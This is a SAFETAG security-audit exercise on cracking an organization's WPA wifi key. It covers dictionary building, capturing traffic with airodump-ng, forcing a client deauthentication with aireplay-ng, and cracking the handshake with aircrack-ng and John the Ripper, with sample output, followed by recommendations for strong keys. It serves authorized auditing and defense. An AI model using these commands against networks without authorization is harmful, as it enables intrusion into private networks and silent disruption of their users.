---
title: WPA Password Cracking
approaches:
  - Technical
authors:
  - SAFETAG
remote_options:
  - None
skills_required:
  - Wireless
  - Traffic Analysis
  - Password auditing
skills_trained: []
summary: >

  The organization’s wireless Local Area Network (WLAN) protects the network and
  its users with WPA encryption. This is an important security measure, and a
  WPA-protected wireless network is much safer than an unencrypted “open”
  network or a WEP-protected network. (WEP is fundamentally flawed, and
  extremely simple attacks have been widely known for over a decade.) However,
  the ease with an attacker could guess the WPA key, or “WiFi password,” is a
  serious issue, particularly considering its importance as an essential
  perimeter control. An attacker who gains access to the wireless LAN
  immediately bypasses many protections that network administrators, and other
  users of the office network, often take for granted. Put another way, anyone
  able to guess the WPA key is immediately “inside the firewall.”


  Using a laptop and a wireless card with a standard, internal antenna (or using
  a customized smartphone or other small device), an attacker could easily
  position themselves close enough to the office to carry out the first phase of
  this attack, which would only take a few minutes. The second phase, which is
  supposed to be the difficult part, could take even less time. From the privacy
  of their own home or office, the attacker could use a minimally customized
  password dictionary to guess the WPA key .


  <!--For reporting, needs time-to-break WPA password -->
overview: ''
materials_needed: >

  * For the (most common) WPA password-based attacks, an already-prepared
  dictionary of words to use to attack the password will be required. See the
  Appendix on Audit Preparation for guidance on dictionary preparation.
considerations: ''
walk_through: >


  An attacker can crack the office’s WPA key in approximately with a short and
  minimally customized password dictionary based on open information about the
  organization and basic word collections.


  **Step 1:** The attacker customizes their WiFi password dictionary, adding
  phrases related to the subject: organization name, street address, phone
  number, email domain, wireless network name, etc. Common password fragments
  are included, as well: qwerty, 12345, asdf and all four-digit dates back to
  the year 2001, for example, among others. The attacker may then add hundreds
  or thousands of words (in English and/or other relevant languages).


  See the Password Strength exercise for details on password dictionary buidling
  and usage.


  **Step 2:** The attacker would then begin recording all (encrypted) wireless
  traffic associated with the organization’s access point:


  ```

  $ sudo airodump-ng -c 1 --bssid 1A:2B:3C:4D:5E:6F -w sampleorg_airodump mon0

   CH  1 ][ Elapsed: 12 mins ][ 2012-01-23 12:34 ][ fixed channel mon0: -1
   BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
   1A:2B:3C:4D:5E:6F  -70 100    12345    43210    6   1  12e. WPA2 CCMP   PSK sampleorg
   BSSID              STATION            PWR   Rate    Lost  Packets  Probes
   1A:2B:3C:4D:5E:6F  01:23:45:67:89:01    0    0e- 0e   186    12345
   1A:2B:3C:4D:5E:6F  AB:CD:EF:AB:CD:EF    0    1e- 1      0     1234
   1A:2B:3C:4D:5E:6F  AA:BB:CC:DD:EE:FF  -76    0e- 1      0     1122
   1A:2B:3C:4D:5E:6F  A1:B2:C3:D4:E5:F6  -80    0e- 1      0     4321
  ```


  wifite is also useful for this step, and claims to automatically de-auth (step
  3).


  **Step 3:** Next, the auditor forces a wireless client, possibly chosen at
  random, to disconnect and reconnect (an operation that is nearly always
  invisible to the user).


  In the example below, AB:CD:EF:AB:CD:EF is the MAC address of a laptop that
  was briefly disconnected in this way.


  ```

  $ aireplay-ng -0 1 -a 1A:2B:3C:4D:5E:6F -c AB:CD:EF:AB:CD:EF mon0

   15:54:48  Waiting for beacon frame (BSSID: 1A:2B:3C:4D:5E:6F) on channel -1
   15:54:49  Sending 64 directed DeAuth. STMAC: [AB:CD:EF:AB:CD:EF] [ 5| 3 ACKs]
  ```


  The goal of this step is to capture the cryptographic handshake that occurs
  when the targeted client reconnects. Try using different clients if the first
  one doesn't work, or try (physically) moving around.


  This handshake does not contain the WPA key itself, but once the the complete
  handshake process has been seen, the auditor (or a potential attacker) can
  leave the vicinity and run various password cracking tools to try and discover
  the password. While a complete password cracking tutorial is out of scope for
  SAFETAG documentation, below are three strategies:


  **Step 4:** The auditor attempts to discover the WPA password.


  A good wordlist with a few tweaks tends to break an unforunate number of
  passwords.  Using a collection of all english words, all words from the
  language of the organization being audited, plus a combination of all these
  words, plus relevant keywords, addresses, and years tends to crack most wifi
  passwords.


  ```bash
      $ aircrack-ng -w pwdpairs.txt -b 1A:2B:3C:4D:5E:6F sampleorg_airodump*.cap
  ```


  For WPA captures, John can either feed in to an aircrack process or attack a
  capture directly.  For captures, you first have to convert the .cap file (from
  wireshark, wifite, airodump, etc.) to a format that John likes.  The Jumbo
  version we use has conversion tools for this available:


  ```bash
    $wpapcap2john wpa.cap > crackme
    $./john -w:password.lst -fo=wpapsk-cuda crackme
  ```
recommendations: >

  The WPA key should be long enough and complex enough to prevent both standard
  dictionary attacks and “brute-force attacks” in which clusters of powerful
  computers work in parallel to test every possible character combination. (We
  recommend 12 or more completely random characters or a passphrase that
  contains four or five—or more—relatively uncommon words.) The key should not
  contain common “phrases,” including number sequences, especially if they are
  related to the organization, its employees or its work. Choosing a strong WPA
  key is one of the most important steps toward defending an organization’s
  network perimeter from an adversary with the ability to spend some time in the
  vicinity of the offices. By extension, mitigating sthis vulnerability is
  critical to the protection of employees and partners (and confidential data)
  from the sort of persistent exposure that eventually brings down even the most
  well-secured information systems.


  Because shared keys inevitably end up being written on whiteboards, given to
  office visitors and emailed to partners, the WPA key should also be changed
  periodically. This does not have to happen frequently, but anything less than
  three or four times per year may be unsafe.

  Assets affected by this issue
organization_size_under: 1000
time_required_minutes: 240
---

